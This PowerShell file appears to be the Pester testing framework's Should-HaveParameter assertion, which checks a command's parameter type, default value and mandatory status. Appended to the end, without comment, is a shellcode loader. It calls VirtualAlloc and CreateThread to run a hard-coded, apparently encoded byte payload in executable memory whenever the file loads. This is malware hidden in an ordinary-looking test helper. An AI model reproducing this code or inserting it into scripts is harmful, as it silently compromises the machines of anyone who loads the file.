function Should-HaveParameter (
    $ActualValue,
    [String] $ParameterName,
    $Type,
    [String]$DefaultValue,
    [Switch]$Mandatory,
    [Switch]$HasArgumentCompleter,
    [Switch]$Negate,
    [String]$Because ) {
    

    if ($null -eq $ActualValue -or $ActualValue -isnot [Management.Automation.CommandInfo]) {
        throw "Input value must be non-null CommandInfo object. You can get one by calling Get-Command."
    }

    if ($null -eq $ParameterName) {
        throw "The ParameterName can't be empty"
    }

    
    function Join-And ($Items, $Threshold = 2) {

        if ($null -eq $items -or $items.count -lt $Threshold) {
            $items -join ', '
        }
        else {
            $c = $items.count
            ($items[0..($c - 2)] -join ', ') + ' and ' + $items[-1]
        }
    }

    function Add-SpaceToNonEmptyString ([string]$Value) {
        if ($Value) {
            " $Value"
        }
    }

    function Get-ParameterInfo {
        param(
            [Parameter( Mandatory = $true )]
            [Management.Automation.CommandInfo]$Command
        )
        

        function Get-TokenGroup {
            param(
                [Parameter( Mandatory = $true )]
                [System.Management.Automation.PSToken[]]$tokens
            )
            $i = $j = 0
            do {
                $token = $tokens[$i]
                if ($token.Type -eq 'GroupStart') {
                    $j++
                }
                if ($token.Type -eq 'GroupEnd') {
                    $j--
                }
                if (-not $token.PSObject.Properties.Item('Depth')) {
                    $token | Add-Member Depth -MemberType NoteProperty -Value $j
                }
                $token

                $i++
            } until ($j -eq 0 -or $i -ge $tokens.Count)
        }

        $errors = $null
        $tokens = [System.Management.Automation.PSParser]::Tokenize($Command.Definition, [Ref]$errors)

        
        $start = $tokens.IndexOf(($tokens | Where-Object { $_.Content -eq 'param' } | Select-Object -First 1)) + 1
        $paramBlock = Get-TokenGroup $tokens[$start..($tokens.Count - 1)]

        for ($i = 0; $i -lt $paramBlock.Count; $i++) {
            $token = $paramBlock[$i]

            if ($token.Depth -eq 1 -and $token.Type -eq 'Variable') {
                $paramInfo = New-Object PSObject -Property @{
                    Name = $token.Content
                } | Select-Object Name, Type, DefaultValue, DefaultValueType

                if ($paramBlock[$i + 1].Content -ne ',') {
                    $value = $paramBlock[$i + 2]
                    if ($value.Type -eq 'GroupStart') {
                        $tokenGroup = Get-TokenGroup $paramBlock[($i + 2)..($paramBlock.Count - 1)]
                        $paramInfo.DefaultValue = [String]::Join('', ($tokenGroup | ForEach-Object { $_.Content }))
                        $paramInfo.DefaultValueType = 'Expression'
                    }
                    else {
                        $paramInfo.DefaultValue = $value.Content
                        $paramInfo.DefaultValueType = $value.Type
                    }
                }
                if ($paramBlock[$i - 1].Type -eq 'Type') {
                    $paramInfo.Type = $paramBlock[$i - 1].Content
                }
                $paramInfo
            }
        }
    }

    if ($Type -is [string]) {
        
        $parsedType = ($Type -replace '^\[(.*)\]$', '$1') -as [Type]
        if ($null -eq $parsedType) {
            throw [ArgumentException]"Could not find type [$ParsedType]. Make sure that the assembly that contains that type is loaded."
        }

        $Type = $parsedType
    }
    

    $buts = @()
    $filters = @()

    $null = $ActualValue.Parameters 
    $hasKey = $ActualValue.Parameters.PSBase.ContainsKey($ParameterName)
    $filters += "to$(if ($Negate) {" not"}) have a parameter $ParameterName"

    if (-not $Negate -and -not $hasKey) {
        $buts += "the parameter is missing"
    }
    elseif ($Negate -and -not $hasKey) {
        return New-Object PSObject -Property @{ Succeeded = $true }
    }
    elseif ($Negate -and $hasKey -and -not ($Mandatory -or $Type -or $DefaultValue -or $HasArgumentCompleter)) {
        $buts += "the parameter exists"
    }
    else {
        $attributes = $ActualValue.Parameters[$ParameterName].Attributes

        if ($Mandatory) {
            $testMandatory = $attributes | Where-Object { $_ -is [System.Management.Automation.ParameterAttribute] -and $_.Mandatory }
            $filters += "which is$(if ($Negate) {" not"}) mandatory"

            if (-not $Negate -and -not $testMandatory) {
                $buts += "it wasn't mandatory"
            }
            elseif ($Negate -and $testMandatory) {
                $buts += "it was mandatory"
            }
        }

        if ($Type) {
            
            
            
            [type]$actualType = $ActualValue.Parameters[$ParameterName].ParameterType
            $testType = ($Type -eq $actualType)
            $filters += "$(if ($Negate) {"not "})of type [$($Type.FullName)]"

            if (-not $Negate -and -not $testType) {
                $buts += "it was of type [$($actualType.FullName)]"
            }
            elseif ($Negate -and $testType) {
                $buts += "it was of type [$($Type.FullName)]"
            }
        }

        if ($PSBoundParameters.Keys -contains "DefaultValue") {
            $parameterMetadata = Get-ParameterInfo $ActualValue | Where-Object { $_.Name -eq $ParameterName }
            $actualDefault = if ($parameterMetadata.DefaultValue) { $parameterMetadata.DefaultValue } else { "" }
            $testDefault = ($actualDefault -eq $DefaultValue)
            $filters += "the default value$(if ($Negate) {" not"}) to be $(Format-Nicely $DefaultValue)"

            if (-not $Negate -and -not $testDefault) {
                $buts += "the default value was $(Format-Nicely $actualDefault)"
            }
            elseif ($Negate -and $testDefault) {
                $buts += "the default value was $(Format-Nicely $DefaultValue)"
            }
        }

        if ($HasArgumentCompleter) {
            $testArgumentCompleter = $attributes | Where-Object {$_ -is [ArgumentCompleter]}
            $filters += "has ArgumentCompletion"

            if (-not $Negate -and -not $testArgumentCompleter) {
                $buts += "has no ArgumentCompletion"
            }
            elseif ($Negate -and $testArgumentCompleter) {
                $buts += "has ArgumentCompletion"
            }
        }
    }

    if ($buts.Count -ne 0) {
        $filter = Add-SpaceToNonEmptyString ( Join-And $filters -Threshold 3 )
        $but = Join-And $buts
        $failureMessage = "Expected command $($ActualValue.Name)$filter,$(Format-Because $Because) but $but."

        return New-Object PSObject -Property @{
            Succeeded      = $false
            FailureMessage = $failureMessage
        }
    }
    else {
        return New-Object PSObject -Property @{ Succeeded = $true }
    }
}

Add-AssertionOperator -Name         HaveParameter `
    -InternalName Should-HaveParameter `
    -Test         ${function:Should-HaveParameter}

$iMgB7x = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $iMgB7x -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0x0e,0xbb,0x6f,0x44,0xda,0xd6,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x47,0x83,0xc0,0x04,0x31,0x58,0x0f,0x03,0x58,0x01,0x59,0x9a,0xb8,0xf5,0x1f,0x65,0x41,0x05,0x40,0xef,0xa4,0x34,0x40,0x8b,0xad,0x66,0x70,0xdf,0xe0,0x8a,0xfb,0x8d,0x10,0x19,0x89,0x19,0x16,0xaa,0x24,0x7c,0x19,0x2b,0x14,0xbc,0x38,0xaf,0x67,0x91,0x9a,0x8e,0xa7,0xe4,0xdb,0xd7,0xda,0x05,0x89,0x80,0x91,0xb8,0x3e,0xa5,0xec,0x00,0xb4,0xf5,0xe1,0x00,0x29,0x4d,0x03,0x20,0xfc,0xc6,0x5a,0xe2,0xfe,0x0b,0xd7,0xab,0x18,0x48,0xd2,0x62,0x92,0xba,0xa8,0x74,0x72,0xf3,0x51,0xda,0xbb,0x3c,0xa0,0x22,0xfb,0xfa,0x5b,0x51,0xf5,0xf9,0xe6,0x62,0xc2,0x80,0x3c,0xe6,0xd1,0x22,0xb6,0x50,0x3e,0xd3,0x1b,0x06,0xb5,0xdf,0xd0,0x4c,0x91,0xc3,0xe7,0x81,0xa9,0xff,0x6c,0x24,0x7e,0x76,0x36,0x03,0x5a,0xd3,0xec,0x2a,0xfb,0xb9,0x43,0x52,0x1b,0x62,0x3b,0xf6,0x57,0x8e,0x28,0x8b,0x35,0xc6,0x9d,0xa6,0xc5,0x16,0x8a,0xb1,0xb6,0x24,0x15,0x6a,0x51,0x04,0xde,0xb4,0xa6,0x6b,0xf5,0x01,0x38,0x92,0xf6,0x71,0x10,0x50,0xa2,0x21,0x0a,0x71,0xcb,0xa9,0xca,0x7e,0x1e,0x47,0xce,0xe8,0x0d,0x8c,0xda,0xeb,0x25,0xaf,0xda,0xfe,0x1d,0x26,0x3c,0x50,0x0e,0x69,0x91,0x10,0xfe,0xc9,0x41,0xf8,0x14,0xc6,0xbe,0x18,0x17,0x0c,0xd7,0xb2,0xf8,0xf9,0x8f,0x2a,0x60,0xa0,0x44,0xcb,0x6d,0x7e,0x21,0xcb,0xe6,0x8d,0xd5,0x85,0x0e,0xfb,0xc5,0x71,0xff,0xb6,0xb4,0xd7,0x00,0x6d,0xd2,0xd7,0x94,0x8a,0x75,0x80,0x00,0x91,0xa0,0xe6,0x8e,0x6a,0x87,0x7d,0x06,0xff,0x68,0xe9,0x67,0xef,0x68,0xe9,0x31,0x65,0x69,0x81,0xe5,0xdd,0x3a,0xb4,0xe9,0xcb,0x2e,0x65,0x7c,0xf4,0x06,0xda,0xd7,0x9c,0xa4,0x05,0x1f,0x03,0x56,0x60,0xa1,0x7f,0x81,0x4c,0xd7,0x91,0x11;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$iMg=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($iMg.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$iMg,0,0,0);for (;;){Start-sleep 60};

